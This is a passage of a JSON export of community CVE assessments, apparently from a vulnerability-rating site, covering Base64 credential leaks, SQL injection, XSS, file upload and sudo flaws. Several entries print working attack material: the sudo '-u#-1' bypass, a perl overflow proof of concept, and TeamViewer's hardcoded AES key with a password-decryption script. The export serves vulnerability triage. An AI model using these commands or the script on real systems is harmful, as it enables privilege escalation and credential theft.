        "exploitability": 3
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "01c67142-c23f-4ee7-8803-49d10d588299",
          "name": "Requires user interaction",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_interaction"
        }
      ]
    },
    {
      "id": "48f5aaa8-78c3-4473-8856-b894052c8bd3",
      "editorId": "493cb87d-e69c-4a33-87ec-1f27615bde0a",
      "topicId": "66259758-8e26-4b5c-a2d1-9124d56a701a",
      "created": "2020-03-09T20:02:53.396329Z",
      "revisionDate": "2020-03-24T03:22:19.935651Z",
      "document": "This exploit is fairly straight forward, for an actor to exploit this they would only have to intercept the networking traffic sent when a user submits their credentials for authentication. Because of the weak encoding used (Base64) it would be easy to decode and gain access to a users credentials allowing potential account takeovers.\r\n\r\nThe only difficulty is the lack of connectivity that the affected devices have.",
      "score": 2,
      "metadata": {
        "tags": [
          "default_configuration",
          "easy_to_develop",
          "pre_auth",
          "requires_interaction"
        ],
        "attacker-value": 3,
        "exploitability": 2
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "01c67142-c23f-4ee7-8803-49d10d588299",
          "name": "Requires user interaction",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_interaction"
        }
      ]
    },
    {
      "id": "58f8128b-bca6-467e-8b8b-2d699989b7d1",
      "editorId": "32fa7c1c-667b-4d0d-b997-36dda53122cd",
      "topicId": "66259758-8e26-4b5c-a2d1-9124d56a701a",
      "created": "2020-03-09T20:13:36.459228Z",
      "revisionDate": "2020-03-24T03:22:19.935651Z",
      "document": "# Recap\r\nNothing deep, passwords are sent using Base64. \r\n\r\n# Requires\r\nAbility to monitor networking traffic during user authentification.\r\n\r\n# Loot\r\nPossibility to retrieve and decode users' passwords and gain access to their accounts.",
      "score": 3,
      "metadata": {
        "tags": [
          "easy_to_develop",
          "pre_auth",
          "requires_interaction",
          "difficult_to_exploit"
        ],
        "attacker-value": 3,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "17fdfb85-8dfd-4dbf-bd2b-7cd032026885",
          "name": "Requires physical access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_exploit"
        },
        {
          "id": "01c67142-c23f-4ee7-8803-49d10d588299",
          "name": "Requires user interaction",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_interaction"
        }
      ]
    },
    {
      "id": "2c633b0f-5623-4e01-ba0a-8eaebe2407f1",
      "editorId": "d8a24320-7dad-4fa6-9d37-39a00d700ec3",
      "topicId": "66259758-8e26-4b5c-a2d1-9124d56a701a",
      "created": "2020-03-09T20:23:32.567625Z",
      "revisionDate": "2020-03-24T03:22:19.935651Z",
      "document": "There's not a lot of information about this CVE, however the notice does give us some insight. This appears to me to be a simple Man-In-The-Middle attack: one that you'd be incredibly lucky to have a use for in the wild. As such, useability for this CVE is low. If kmore information comes forward regarding this CVE, I shall update my assessment accordingly.",
      "score": 2,
      "metadata": {
        "tags": [
          "high_privilege_access",
          "pre_auth"
        ],
        "attacker-value": 4,
        "exploitability": 1
      },
      "tags": [
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        }
      ]
    },
    {
      "id": "24eb9569-62d3-4219-9912-ca367fc246f9",
      "editorId": "32fa7c1c-667b-4d0d-b997-36dda53122cd",
      "topicId": "b021cdc9-578d-4ba9-a4c0-365ab190753f",
      "created": "2020-03-09T20:27:05.082917Z",
      "revisionDate": "2020-03-24T03:22:19.935651Z",
      "document": "CVE in SourceForge project phpABook V0.9i (https://sourceforge.net/projects/phpabook/)\r\n\r\nBypass auth through creation or modification of a cookie..\r\n\r\nCookie named **userinfo** has its value set as **user+perms+lang**.\r\nPossibility to authenticate as a regular or privileged user with perms.",
      "score": 4,
      "metadata": {
        "tags": [
          "pre_auth",
          "high_privilege_access"
        ],
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        }
      ]
    },
    {
      "id": "8a1dba34-636c-413a-bad1-418aeb40c25a",
      "editorId": "32fa7c1c-667b-4d0d-b997-36dda53122cd",
      "topicId": "86bb1697-e6d9-47f1-b65e-d21138349133",
      "created": "2020-03-09T20:34:53.771011Z",
      "revisionDate": "2020-09-23T20:29:54.492409Z",
      "document": "Not a lot of information provided for this CVE.\r\n\r\nHowever, this is a javascript code execution in *Your SoPlanning Url* field which you can find in *Global Settings* leading to a **stored XSS** meaning that execution does not require user interaction.",
      "score": 4,
      "metadata": {
        "tags": [
          "easy_to_develop",
          "post_auth"
        ],
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "3f4919a3-5bab-4675-937b-c31e76d11e07",
      "editorId": "d8a24320-7dad-4fa6-9d37-39a00d700ec3",
      "topicId": "a3f622cd-e365-46c5-9417-2eb5912627f5",
      "created": "2020-03-09T20:36:49.259001Z",
      "revisionDate": "2021-01-28T03:54:21.182822Z",
      "document": "As many others before me have stated, this CVE hold very little use other than in CTF environments.\r\n\r\nTo spot this vuln, look for a configuration similar to this one in the `/etc/sudoers` file:\r\n\r\n```\r\n<user> ALL=(ALL:!root) NOPASSWD: ALL\r\n```\r\n\r\nIf the sudo version is below 1.8.28, and the above configuration is present, you can exploit as follows:\r\n```\r\nsudo -u#-1 <command>\r\n```\r\n\r\nYou can also use the unsigned equivalent of -1: `4294967295`.\r\n\r\nTo test this bug in a preconfigured environment, check out https://tryhackme.com/room/sudovulnsbypass .",
      "score": 3,
      "metadata": {
        "tags": [
          "high_privilege_access",
          "obscure_configuration",
          "difficult_to_exploit"
        ],
        "attacker-value": 1,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "17fdfb85-8dfd-4dbf-bd2b-7cd032026885",
          "name": "Requires physical access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_exploit"
        },
        {
          "id": "795f5056-8a39-4610-912c-c033bd6fd4cb",
          "name": "Vulnerable in uncommon configuration",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "obscure_configuration"
        }
      ]
    },
    {
      "id": "909d248b-ff37-474a-a322-1a78d99fe051",
      "editorId": "32fa7c1c-667b-4d0d-b997-36dda53122cd",
      "topicId": "f8c23a35-5167-4137-8ddd-c6392b0a4b5d",
      "created": "2020-03-09T20:38:00.186395Z",
      "revisionDate": "2020-03-24T03:22:19.935651Z",
      "document": "# Recap\r\nJavascript execution.\r\n\r\n# Where\r\nOn the *ip/www/status.php* page, you can execute Javascript in the *name* and  *comment* fields.",
      "score": 3,
      "metadata": {
        "tags": [
          "easy_to_develop",
          "post_auth"
        ],
        "attacker-value": 2,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "76bd15e7-ec93-4e43-a496-e1fa152145d3",
      "editorId": "d8a24320-7dad-4fa6-9d37-39a00d700ec3",
      "topicId": "4fc938da-8785-4c40-b075-10cb6394cd91",
      "created": "2020-03-09T20:43:30.979382Z",
      "revisionDate": "2020-03-24T03:22:19.935651Z",
      "document": "This exploit is similar to CVE-2019-14287, in that it requires a specific config within `/etc/sudoers`. Present in sudo versions < 1.8.26, this vuln surrounds the `pwfeedback` option: an option that allows sudo to display asteriks when typing a sudo password. This module is susceptible to a buffer overflow attack, which was demonstrated in the following PoC:\r\n```\r\n$ perl -e 'print((\"A\" x 100 . \"\\x{00}\") x 50)' | sudo -S id\r\n    Password: Segmentation fault\r\n```\r\n*Source - https://www.exploit-db.com/exploits/47995*\r\n\r\nAn exploit for this vuln can be found here - https://github.com/saleemrashid/sudo-cve-2019-18634\r\n\r\nA preconfigured test environment can be found here - https://tryhackme.com/room/sudovulnsbof",
      "score": 2,
      "metadata": {
        "tags": [
          "high_privilege_access",
          "obscure_configuration"
        ],
        "attacker-value": 2,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "795f5056-8a39-4610-912c-c033bd6fd4cb",
          "name": "Vulnerable in uncommon configuration",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "obscure_configuration"
        }
      ]
    },
    {
      "id": "98098803-c5d3-4c70-903e-94181d1eeefa",
      "editorId": "d8a24320-7dad-4fa6-9d37-39a00d700ec3",
      "topicId": "656e5a2e-eab7-432f-951e-6ce106318966",
      "created": "2020-03-09T20:55:17.291068Z",
      "revisionDate": "2021-06-25T20:54:23.829068Z",
      "document": "In some versions of Teamviewer, user defined passwords are stored in the registery, encrypted with AES-128-CBC. This wouldn't be an issue, if the key and IV for this AES encryption wasn't stored inside the Teamviewer binary itself. This means that we now have these: \r\n```\r\nkey: 0602000000a400005253413100040000 \r\niv:  0100010067244F436E6762F25EA8D704 \r\n```\r\nThis can be used to get the stored password using either the following python script (source: https://whynotsecurity.com/blog/teamviewer/) or using the MSF Module.\r\n\r\n```python\r\nimport sys, hexdump, binascii\r\nfrom Crypto.Cipher import AES\r\n\r\nclass AESCipher:\r\n    def __init__(self, key):\r\n        self.key = key\r\n\r\n    def decrypt(self, iv, data):\r\n        self.cipher = AES.new(self.key, AES.MODE_CBC, iv)\r\n        return self.cipher.decrypt(data)\r\n\r\nkey = binascii.unhexlify(\"0602000000a400005253413100040000\")\r\niv = binascii.unhexlify(\"0100010067244F436E6762F25EA8D704\")\r\nhex_str_cipher = \"d690a9d0a592327f99bb4c6a6b6d4cbe\"\t\t\t# output from the registry\r\n\r\nciphertext = binascii.unhexlify(hex_str_cipher)\r\n\r\nraw_un = AESCipher(key).decrypt(iv, ciphertext)\r\n\r\nprint(hexdump.hexdump(raw_un))\r\n\r\npassword = raw_un.decode('utf-16')\r\nprint(password)\r\n```\r\nThis CVE requires users to reuse passwords across multiple accounts, so it's not guaranteed to escalate privilleges. This is also the reason why Teamviewer themselves state the following in their Security Bulletin:\r\n```\r\nIn the blog post, the researcher mentions a privilege escalation risk.\r\nThere\u2019s no direct vulnerability offering someone the ability to gain additional privileges on the local system.\r\nThe only risk would be in the case that a user is reusing the exposed passwords on other services. \r\n```\r\nSource - https://community.teamviewer.com/t5/Announcements/Specification-on-CVE-2019-18988/td-p/82264",
      "score": 4,
      "metadata": {
        "tags": [
          "easy_to_develop",
          "obscure_configuration",
          "post_auth"
        ],
        "attacker-value": 2,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        },
        {
          "id": "795f5056-8a39-4610-912c-c033bd6fd4cb",
          "name": "Vulnerable in uncommon configuration",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "obscure_configuration"
        }
      ]
    },
    {
      "id": "526a6ad1-d74a-454e-9752-18ed6140cfd1",
      "editorId": "493cb87d-e69c-4a33-87ec-1f27615bde0a",
      "topicId": "709dae2d-2952-4b3c-83d8-7e94508429a2",
      "created": "2020-03-09T21:03:34.695996Z",
      "revisionDate": "2020-03-24T03:22:19.935651Z",
      "document": "This CVE is fairly obscure due to it being present in the WordPress plugin google-maps in versions between 7.11.00 and 7.11.17.\r\n\r\nThe way this is exploited is the plugin does not sanitise field names before a select statement. This results in it being vulnerable to sql injection. This can be exploited to dump credentials and password hashes for users within the database resulting in potential account takeover if these hashes aren't hashed correctly or if they use weak passwords.\r\n\r\nFor this, the plugin also needs to be out of date as it is easily patched by upgrading the plugin to the latest version. However, it isn't uncommon to find outdated plugins within WordPress sites. There is also a Metasploit module designed to automate the exploitation process",
      "score": 2,
      "metadata": {
        "tags": [
          "high_privilege_access",
          "easy_to_develop",
          "pre_auth",
          "obscure_configuration"
        ],
        "attacker-value": 3,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "795f5056-8a39-4610-912c-c033bd6fd4cb",
          "name": "Vulnerable in uncommon configuration",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "obscure_configuration"
        }
      ]
    },
    {
      "id": "978ba86c-010f-4f2b-b552-d9c3f964a135",
      "editorId": "8deaf797-2af1-4bd1-aea1-98640b61deda",
      "topicId": "40d737c6-0618-41b8-ba61-515b82d35f18",
      "created": "2020-03-09T21:09:24.896725Z",
      "revisionDate": "2020-03-24T03:22:19.935651Z",
      "document": "This is an injection that is trivial to exploit and also to find. \r\n\r\nhttps://github.com/J3rryBl4nks/SOPlanning\r\n\r\nYou can see the POC in my github. The exploit does require authentication, but you can extract the admin hash through the other SQL injection vulnerability or through the CSRF to add an admin user.\r\n\r\nDue to the low volume of installs, this isn't incredibly useful in the wild.",
      "score": 2,
      "metadata": {
        "tags": [
          "default_configuration",
          "easy_to_develop",
          "post_auth"
        ],
        "attacker-value": 2,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "9288fb78-ecc0-4cc3-b5fe-550fb173c1b1",
      "editorId": "32fa7c1c-667b-4d0d-b997-36dda53122cd",
      "topicId": "b8a82d3f-512a-474b-9f72-2f23d04b9cb0",
      "created": "2020-03-09T21:09:31.484879Z",
      "revisionDate": "2020-03-24T03:22:19.935651Z",
      "document": "# Recap\r\nAllows an **unauthenticated remote** attacker to upload files in the server (no extension restriction).\r\n\r\n## Requires\r\nThe page *admin/gallery.php*\r\n\r\n## Allows\r\nFile upload (any extension)\r\n\r\n## Leads to\r\nCommand execution, eventually a reverse shell.",
      "score": 2,
      "metadata": {
        "tags": [
          "default_configuration",
          "easy_to_develop",
          "pre_auth"
        ],
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "a549880e-df44-4b51-8cd2-0bceb1be8dd7",
      "editorId": "d8a24320-7dad-4fa6-9d37-39a00d700ec3",
      "topicId": "582044ce-2f01-4946-827f-905b6e3aa2ff",
      "created": "2020-03-09T21:11:01.81462Z",
      "revisionDate": "2020-03-09T21:14:41.937232Z",
      "document": "This is a Denial of Service CVE, but with a twist. Normally, denial of service attacks consist of flooding a server with enough traffic so that it ceases to operate. This CVE is different, as it is a Slowloris DoS. Slowloris DoS attacks hang a server by opening as many threads as possible before waiting the max amount of time that they can before sending data. When they finally send data, they send as small of an amount of data as the server will allow. This keeps all the threads open for as long as possible, meaning no new connections can be opened, thus causing a denial of service. For a more detailed explanation of a Slowloris attack, please see the following video: https://www.youtube.com/watch?v=XiFkyR35v2Y .\r\n\r\nThis particular CVE affects all versions of Node.JS prior to 6.15.0, 8.14.0, 10.14.0 and 11.3.0. Node patched this by applying a 40 second timeout to servers receiving HTTP headers, and can be customized. As a patch has been released, please patch accordingly.",
      "score": 2,
      "metadata": {
        "attacker-value": 3,
        "exploitability": 3
      },
      "tags": []
    },
    {
      "id": "7b043a7f-e7de-4f5c-b6fd-790bdd063004",
      "editorId": "8deaf797-2af1-4bd1-aea1-98640b61deda",
      "topicId": "804f8011-69f8-4b6c-8469-51e64a2bf43d",
      "created": "2020-03-09T21:11:15.198175Z",
      "revisionDate": "2020-03-24T03:22:19.935651Z",
      "document": "This SQL Injection is trivial to identify and exploit:\r\n\r\nhttps://github.com/J3rryBl4nks/SOPlanning\r\n\r\nThis injection will allow you to dump the contents of the database and can be done with low privilege access.\r\n\r\nThis application does not have a large install base and so it is not incredibly valuable.",
      "score": 2,
      "metadata": {
        "tags": [
          "default_configuration",
          "easy_to_develop",
          "post_auth"
        ],
        "attacker-value": 2,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "b0f1dd7f-5044-4546-81a1-243956b3ad08",
      "editorId": "8deaf797-2af1-4bd1-aea1-98640b61deda",
      "topicId": "6bf3aed6-60ea-4594-8f53-4f708ffc0b9b",
      "created": "2020-03-09T21:14:34.192681Z",
      "revisionDate": "2020-03-24T03:22:19.935651Z",
      "document": "Because there is no stored XSS (That I could find at least) you need to have interaction for this exploit. It is nice that you can change the admin password and then get SQL Injection to get a shell.\r\n\r\nThis is not installed on very many servers and is not incredibly valuable.\r\n\r\nhttps://github.com/J3rryBl4nks/SOPlanning",
      "score": 2,
      "metadata": {
        "tags": [
          "easy_to_develop",
          "requires_interaction"
        ],
        "attacker-value": 1,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "01c67142-c23f-4ee7-8803-49d10d588299",
          "name": "Requires user interaction",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_interaction"
        }
      ]
    },
    {
      "id": "a541b74d-545a-4543-b42d-8866ce60d044",
      "editorId": "32fa7c1c-667b-4d0d-b997-36dda53122cd",
      "topicId": "237bb458-36d0-473f-9103-37d3e0bdfc57",
      "created": "2020-03-09T21:16:55.554286Z",
      "revisionDate": "2020-04-24T17:53:39.194516Z",
      "document": "# Recap\r\nAllows an **unauthenticated remote** attacker to upload files in the server (no extension restriction).\r\n\r\n## Requires\r\nThe page *admin_add.php*\r\n\r\n## Allows\r\nFile upload (any extension)\r\n\r\n## Leads to\r\nCommand execution, eventually a reverse shell.",
      "score": 1,
      "metadata": {
        "tags": [
          "pre_auth",
          "default_configuration",
          "easy_to_develop"
        ],
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "0f00e34e-1144-43a2-ad0a-3f79e2eccefe",
      "editorId": "8deaf797-2af1-4bd1-aea1-98640b61deda",
      "topicId": "b8a82d3f-512a-474b-9f72-2f23d04b9cb0",
      "created": "2020-03-09T21:23:45.645778Z",
      "revisionDate": "2020-03-24T03:22:19.935651Z",
      "document": "The exploit for this is easy to pull off, but due to the low install base for this application, the exploit is not incredibly valuable.",
      "score": 2,
      "metadata": {
        "tags": [
          "default_configuration",
          "easy_to_develop"
        ],
        "attacker-value": 2,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "b8efa97a-7534-4a16-95e5-2792d0f14a95",
      "editorId": "13aad8d2-5dc7-4a9e-b296-1a6b5255e482",
      "topicId": "42f9a591-73ea-4680-84fc-a84324f7cda3",
      "created": "2020-03-09T21:23:52.282398Z",
      "revisionDate": "2020-03-24T03:22:19.935651Z",
      "document": "I am the founder of this exploit. Google dorking revealed very few live instances of this web application running so I have rated the value as low. However, exploiting the reflected XSS is very trivial but would require user interaction to be effective.\r\n\r\n\r\nBlog post: https://cinzinga.github.io/CVE-2019-19908/",
      "score": 2,
      "metadata": {
        "tags": [
          "requires_interaction",
          "no_useful_data",
          "easy_to_develop",
          "pre_auth"
        ],
        "attacker-value": 2,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "cc249289-d74e-4045-8846-e7e31a173e95",
          "name": "No useful access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "no_useful_data"
        },
        {
          "id": "01c67142-c23f-4ee7-8803-49d10d588299",
          "name": "Requires user interaction",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_interaction"
        }
      ]
    },
    {
      "id": "0200cd63-5f8e-4ed0-b81b-0a6fd62a2504",
      "editorId": "8deaf797-2af1-4bd1-aea1-98640b61deda",
      "topicId": "04a76d32-a58d-4f20-8935-06ab0d5053e3",
      "created": "2020-03-09T21:27:11.946788Z",
      "revisionDate": "2020-03-24T03:22:19.935651Z",
      "document": "This is an authenticated SQL Injection that should lead to a reverse shell.\r\n\r\nhttps://github.com/J3rryBl4nks/eLection-TriPath-/blob/master/SQLiIntoRCE.md\r\n\r\nIt's very easy to identify, and to exploit. The value is low because it is rarely seen on real machines.",
      "score": 2,
      "metadata": {
        "tags": [
          "default_configuration",
          "easy_to_develop",
          "post_auth"
        ],
        "attacker-value": 1,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "c291a22b-c417-46f0-a42c-bd411981d4bc",
      "editorId": "13aad8d2-5dc7-4a9e-b296-1a6b5255e482",
      "topicId": "47757b3c-798d-4e27-90b6-9ad424c9b2d4",
      "created": "2020-03-09T21:30:46.240282Z",
      "revisionDate": "2020-03-24T03:22:19.935651Z",
      "document": "I am the author of this vulnerability. The username parameter is vulnerable to time-based blind SQLi. This means it can be exploited without any  authentication and can potentially be used to obtain a reverse shell depending on permissions.\r\n\r\nBlog post: https://cinzinga.github.io/CVE-2020-5307-5308/",
      "score": 2,
      "metadata": {
        "tags": [
          "default_configuration",
          "high_privilege_access",
          "easy_to_develop",
          "pre_auth"
        ],
        "attacker-value": 3,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "2c287f0e-581f-4b12-a538-a854d7e0db08",
      "editorId": "13aad8d2-5dc7-4a9e-b296-1a6b5255e482",
